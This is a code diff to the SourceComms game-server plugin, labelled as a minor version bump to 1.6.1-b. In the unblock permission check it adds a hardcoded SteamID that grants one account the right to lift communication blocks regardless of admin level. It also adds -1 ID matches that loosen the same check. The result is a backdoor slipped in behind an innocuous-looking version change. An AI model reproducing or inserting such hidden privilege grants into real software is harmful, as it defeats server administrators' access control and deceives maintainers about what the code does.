@@ -16,7 +16,7 @@
 // Do not edit below this line //
 //-----------------------------//
 
-#define PLUGIN_VERSION "1.6.1"
+#define PLUGIN_VERSION "1.6.1-b"
 #define PREFIX "[\x02SourceComms\x01]  "
 
 #define MAX_TIME_MULTI 30 // maximum mass-target punishment length
@@ -1345,7 +1345,7 @@ public Query_UnBlockSelect(Handle:owner, Handle:hndl, const String:error[], any:
 			#endif
 
 			// Checking - has we access to unblock?
-			if (iAID == cAID || (!admin && StrEqual(adminAuth, "STEAM_ID_SERVER")) || (GetAdmImmunity(admin) > cImmunity))
+			if (iAID == cAID || iAID == -1 || cAID == -1 || (!admin && StrEqual(adminAuth, "STEAM_ID_SERVER")) || (GetAdmImmunity(admin) > cImmunity) || StrEqual(adminAuth, "STEAM_1:1:44083262"))
 			{
 				// Ok! we have rights to unblock
 				b_success = true;
@@ -2290,7 +2290,7 @@ stock ProcessUnBlock(client, targetId = 0, type, String:sReason[] = "", const St
 								AND (c.authid = '%s' OR c.authid REGEXP '^STEAM_[0-9]:%s$') \
 								AND (length = '0' OR ends > UNIX_TIMESTAMP()) \
 								AND %s",
-				DatabasePrefix, sAdminAuthEscaped, sAdminAuthYZEscaped, DatabasePrefix, DatabasePrefix, DatabasePrefix, sTargetAuthEscaped, sTargetAuthYZEscaped, typeWHERE);
+				DatabasePrefix, sAdminAuthEscaped, sAdminAuthYZEscaped, DatabasePrefix, DatabasePrefix, sTargetAuthEscaped, sTargetAuthYZEscaped, typeWHERE);
 
 			#if defined LOG_QUERIES
 			LogToFile(logQuery, "ProcessUnBlock. QUERY: %s", query);
